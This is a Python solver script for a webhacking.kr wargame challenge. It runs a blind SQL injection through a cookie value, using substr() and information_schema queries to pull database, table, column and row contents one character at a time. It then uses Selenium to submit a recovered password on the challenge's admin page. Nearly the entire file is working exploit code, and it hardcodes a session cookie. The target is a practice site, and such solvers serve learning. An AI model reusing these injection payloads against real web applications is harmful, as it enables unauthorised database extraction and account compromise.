import requests
from selenium import webdriver

# TRUE : 01 FALSE: 00

def HttpReq(select=None, dbn=None, tbn=None, coln=None):
    
    url = 'https://webhacking.kr/challenge/web-02/'
    keys = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    cookie = {'PHPSESSID': 'e8j3vm6uvuh4fqlgml274or3ek'}
    val = ''
    
    for i in range(1,50):
        for key in keys:
            if select == 1:
                cookie['time'] = 'substr((select database()), {}, 1)="{}"'.format(i, key)
            elif select == 2:
                cookie['time'] = 'substr((select group_concat(table_name) from information_schema.tables where table_schema = "{}"),{},1) = "{}"'.format(dbn, i, key)
            elif select == 3:
                cookie['time'] = 'substr((select group_concat(column_name) from information_schema.columns where table_name="{}"), {}, 1) = "{}"'.format(tbn, i, key)
            elif select == 4:
                cookie['time'] = 'substr((select {} from {}),{},1) = "{}"'.format(coln, tbn, i, key)
            
            res = requests.get(url=url, cookies=cookie)
            if '09:00:01' in res.text:
                val += key
                #print(val)
                break
            if key == '0':
                return val 

def getFlag(cookie=None):
    
    dbn = HttpReq(select=1)
    tbn = HttpReq(select=2, dbn=dbn)
    coln = HttpReq(select=3, tbn=tbn)
    data = HttpReq(select=4, tbn=tbn, coln=coln)

    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = webdriver.Chrome(executable_path='chromedriver', options=options)

    driver.get(url='https://webhacking.kr/challenge/web-02/admin.php')
    driver.delete_all_cookies()
    driver.add_cookie(cookie)
    driver.refresh
    driver.find_element_by_xpath('/html/body/form/input[1]').send_keys('kudos_to_beistlab')
    # driver.find_element_by_xpath('/html/body/form/input[1]').send_keys(data)

    driver.find_element_by_xpath('/html/body/form/input[2]').click()
    try:
        al = driver.switch_to_alert()
        if 'already solved' in al.text:
            print('#02 PASS ')
        al.accept()
    except:
        print("ERROR NO.02")
    driver.close()



if __name__ == '__main__':
    data = getFlag()
    
    # dbn = HttpReq(select=1)
    # tbn = HttpReq(select=2, dbn=dbn)
    # coln = HttpReq(select=3, tbn=tbn)
    # data = HttpReq(select=4, tbn=tbn, coln=coln)

    # print("===========================")
    # print("DB NAME    : "+dbn)
    # print("TABLE NAME : "+tbn)
    # print("COLUMN NAME: "+coln)
    # print("DATA       : "+data)
    # print("===========================")
